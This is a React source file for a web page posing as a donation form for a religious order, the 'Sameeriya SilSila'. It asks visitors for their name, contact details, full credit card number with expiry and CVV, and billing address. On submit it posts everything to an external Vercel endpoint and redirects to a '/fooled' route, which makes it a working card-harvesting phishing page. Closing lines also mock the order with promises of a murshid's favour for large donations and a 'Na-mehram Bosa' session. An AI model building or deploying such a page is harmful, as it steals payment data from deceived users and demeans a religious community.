import React,{useState} from 'react'
import {Button, TextInput} from 'flowbite-react'
import { IoIosCard } from 'react-icons/io';
import {Alert} from "flowbite-react"
import { MdNetworkCheck } from "react-icons/md";
import { Link, useNavigate } from 'react-router-dom';
import axios from 'axios'
const form = () => {
   const [formData,setFormData] = useState('')
   const navigate = useNavigate()
   const changeHandler = (e)=>{
      setFormData({
         ...formData,
          [e.target.id]:e.target.value
      })
   }
   const submitHandler = async(e)=>{
      e.preventDefault()
      try {
         
         const data = await axios.post('https://mern-form-n7800dxbp-ms4492222gmailcoms-projects.vercel.app/submitFiles',formData)
         console.log(data)
            navigate('/fooled')
      } catch (error) {
         console.log(error)
      }
   }
  return (
    <>
     <form onSubmit={submitHandler} className='flex justify-center items-center h-screen'>
         <div className='mx-auto bg-slate-100 w-[25rem] md:w-[34rem] h-[35rem] sm:w-[27rem] flex flex-col items-center border border-gray-400 shadow-lg'>
         <h1 className='flex text-xl w-[12rem] font-bold text-green-700 from-purple-600 to-blue-500 underline'>Peer Connection <span><MdNetworkCheck/></span>  </h1>
         <span className='mr-9 text-[10px] font-semibold text-gray-400'>[Handles North branch]</span>
      <Alert color='blue'><span>Donation Form to Join the Sameeriya SilSila</span></Alert>
         <div className='flex'>
         <div className=''>
          <div className='mx-2'>
             <label className='block text-gray-700 text-sm font-bold mb-2' htmlFor='First Name'>First Name</label>
             <TextInput onChange={changeHandler} required id='firstname' type='text' placeholder='Enter firstname' />
          </div>
          <div className='mx-2'>
             <label className='block text-gray-700 text-sm font-bold mb-2' htmlFor='Last Name'>Last Name</label>
             <TextInput onChange={changeHandler} required id='lastname' type='text' placeholder='Enter lastname' />
          </div>
         </div>
         <div>
          <div>
             <label className='block text-gray-700 text-sm font-bold mb-2' htmlFor='Phone Number'>Phone Number</label>
             <TextInput onChange={changeHandler}  id='phonenumber' type='number' placeholder='Enter phone number' />
          </div>
          <div >
             <label className='block text-gray-700 text-sm font-bold mb-2' htmlFor='Email Address'>Email Address</label>
             <TextInput onChange={changeHandler} required id='email' type='email' placeholder='Enter email address' />
          </div>
         </div>
         </div>
         <div className='w-[23rem] sm:w-[27rem] md:[34rem]'>
             <label className='block text-gray-700 text-sm font-bold mb-2' htmlFor='Chanda'>How much do you want to give as Nazrana</label>
             <TextInput onChange={changeHandler} required id='nazrana' type='text' placeholder='Nazrana Amount' />
          </div>
          <div className='relative w-[23rem] sm:w-[27rem] md:[34rem]'>
             <label className='block text-gray-700 text-sm font-bold mb-2' htmlFor='Email Address'>Credit Card</label>
             <p className='absolute top-[2.64rem] left-2 z-10'><IoIosCard/></p>
             <TextInput onChange={changeHandler} id='card' type='text' placeholder='      Card Number                           MM/YY   CVV'/>
             
          </div>
          <div className='w-[23rem] sm:w-[27rem] md:[34rem]'>
             <label className='block text-gray-700 text-sm font-bold mb-2' htmlFor='Email Address'>Billing Address</label>
             <TextInput onChange={changeHandler} id='address' type='text' placeholder='Address Line 1' />
          </div>
          <Button gradientDuoTone='purpleToPink' type='submit' className='w-[23rem] sm:w-[27rem] md:[34rem] my-2'>Pay Now</Button>
          <p className='font-semibold text-[11px] px-2 '>there is no force on donation, but if someone donates more than 10K $ then they will have special nigaah of murshid </p>
          <p className='text-[9px] bg-green-100 font-semibold text-green-500'>Na-mehram Bosa(بوسة) session will be after raks and wajd. </p>
         </div>   
     </form>
    </>
  )
}

export default form
